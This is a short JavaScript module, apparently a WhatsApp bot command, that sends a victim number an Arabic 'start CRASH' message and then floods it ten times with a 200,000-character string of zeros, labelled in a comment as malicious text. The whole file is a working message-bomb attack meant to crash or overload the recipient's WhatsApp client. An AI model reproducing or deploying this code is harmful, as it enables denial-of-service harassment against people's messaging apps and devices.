module.exports = async (sock, number) => {
    await sock.sendMessage(number + "@s.whatsapp.net", {
        text: "💀⚡ بدء CRASH…"
    });

    const payload = "0".repeat(200000); // 200KB نص خبيث

    for (let i = 0; i < 10; i++) {
        await sock.sendMessage(number + "@s.whatsapp.net", {
            text: payload
        });
    }
};
